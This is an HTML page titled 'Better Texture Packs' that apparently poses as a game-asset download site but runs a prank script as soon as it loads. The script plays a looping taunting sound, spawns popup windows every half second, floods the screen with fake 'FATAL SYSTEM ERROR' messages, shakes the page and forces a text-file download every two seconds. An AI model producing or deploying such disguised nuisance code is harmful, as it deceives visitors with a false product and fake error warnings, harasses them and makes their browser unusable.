<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Better Texture Packs</title>
    <style>
        body {
            background: url('https://iili.io/2LnOhhX.png') no-repeat center center fixed;
            background-size: cover;
            text-align: center;
            font-family: Arial, sans-serif;
            color: white;
            overflow: hidden;
            transition: all 0.1s;
        }
        .troll-window {
            position: absolute;
            background: black;
            color: white;
            padding: 20px;
            border: 2px solid red;
            font-size: 20px;
            font-weight: bold;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <audio id="trollSound" src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" preload="auto" loop></audio>
    
    <script>
        function troll() {
            alert("YOU ARE AN IDIOT! AHAHAHAAAAA");
            document.getElementById("trollSound").play();
            
            setInterval(() => {
                window.open("https://iili.io/2LnOhhX.png", "", "width=400, height=300");
            }, 500);
            
            setInterval(() => {
                let trollDiv = document.createElement("div");
                trollDiv.classList.add("troll-window");
                trollDiv.innerText = ["ERROR 404!", "YOU ARE DOOMED!", "HAHAHAHA!", "NO ESCAPE!", "FATAL SYSTEM ERROR!", "CRITICAL MALFUNCTION!", "INFINITE CHAOS!", "TROLLED!"][Math.floor(Math.random() * 8)];
                trollDiv.style.top = Math.random() * window.innerHeight + "px";
                trollDiv.style.left = Math.random() * window.innerWidth + "px";
                document.body.appendChild(trollDiv);
            }, 50);
            
            setInterval(() => {
                let glitch = document.createElement("div");
                glitch.style.position = "absolute";
                glitch.style.top = Math.random() * window.innerHeight + "px";
                glitch.style.left = Math.random() * window.innerWidth + "px";
                glitch.style.color = "lime";
                glitch.style.fontSize = "30px";
                glitch.innerText = "YOU ARE AN IDIOT!";
                document.body.appendChild(glitch);
            }, 30);
            
            setInterval(() => {
                document.body.style.transform = `rotate(${Math.random() * 10 - 5}deg) scale(${1 + Math.random() * 0.1}) translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
            }, 100);
            
            setInterval(() => {
                let textFile = new Blob(["YOU ARE AN IDIOT! AHAHAHAAAAA"], { type: "text/plain" });
                let downloadLink = document.createElement("a");
                downloadLink.href = URL.createObjectURL(textFile);
                downloadLink.download = "trolled.txt";
                document.body.appendChild(downloadLink);
                downloadLink.click();
                document.body.removeChild(downloadLink);
            }, 2000);
        }
        
        window.onload = troll;
    </script>
</body>
</html>
